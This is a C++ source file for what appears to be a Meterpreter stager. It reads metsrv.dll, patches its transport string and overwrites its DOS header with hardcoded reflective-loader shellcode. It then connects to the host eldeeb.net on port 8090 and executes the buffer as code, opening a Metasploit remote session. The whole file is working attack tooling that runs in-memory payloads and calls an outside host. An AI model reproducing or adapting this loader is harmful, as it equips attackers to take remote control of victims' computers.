//»”„ «··Â «·—Õ„‰ «·—ÕÌ„
#include "main.h"

char* global_meterpreter_transport = "METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char* global_meterpreter_url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
char* global_meterpreter_ua = "METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
int global_expiration_timeout = 0xb64be661; //big
int global_comm_timeout       = 0xaf79257f; // 300

// Till I learn how to properly parse DLL files for RVAs and such, I just hard coded the ReflectiveDll stub... sorry for that.
const char* ReflectiveDllBootLoader = "\x4D\x5A\xE8\x00\x00\x00\x00\x5B\x52\x45\x55\x89\xE5\x81\xC3\x37\x15\x00\x00\xFF\xD3\x89\xC3\x57\x68\x04\x00\x00\x00\x50\xFF\xD0\x68\xE0\x1D\x2A\x0A\x68\x05\x00\x00\x00\x50\xFF\xD3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE0\x00";



int wmain(int argc, wchar_t *argv[])
{

	BYTE* buffer = nullptr;
	DWORD bufferSize = 0;
	DWORD index = 0;
	SOCKET ConnectSocket = INVALID_SOCKET;
	void (*function)();
	///////////////////////////////
	// !!! Load from file stuff !!!
	///////////////////////////////
	// To be edited when options are added

	wchar_t filename[MAX_PATH] = {0};
	if(argc == 1)
	{
		wcscpy_s(filename,L"e:\\metsrv.dll");
	}
	else { wcscpy_s(filename,argv[1]);
	}

	bufferSize = CopyStageToBuffer(filename, &buffer);
	const char Transport[] = "METERPRETER_TRANSPORT";
	const char ReplacementTransport[] = "METERPRETER_TRANSPORT_SSL";
	//PatchString(buffer, Transport, ReplacementTransport);
	index = binstrstr(buffer, (int)bufferSize, (BYTE*)Transport, (int)strlen(Transport));
	dprintf(L"[*] Patching transport, Offset found at 0x%08x\n", index);
	PatchString(buffer, ReplacementTransport, index, strlen(ReplacementTransport));

	index = binstrstr(buffer, (int)bufferSize, (BYTE*)"MZ", (int)strlen("MZ"));
	dprintf(L"[*] Patching ReflectiveDllBootstrap, Offset found at 0x%08x\n", index);	
	//PatchString(buffer, ReflectiveDllBootLoader, index, strlen(ReflectiveDllBootLoader));
	memcpy(buffer+index, ReflectiveDllBootLoader, 62);//dos header can't exceed 62

	ConnectSocket = get_socket("eldeeb.net","8090");
	if (ConnectSocket == INVALID_SOCKET) dprintf(L"Failed to connect...\n");

	dprintf(L"[*] Setting EDI-to-be value to 0xBF at 0x%08x\n", &buffer);
	buffer[0] = 0xBF;
	dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
	memcpy(buffer+1, &ConnectSocket, 4);
	dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
	dprintf(L"[*] Calling the function, bye bye inmet, hello metasploit!\n");

	function = (void (*)())buffer;
	function();
	//function();


	return 0;
}
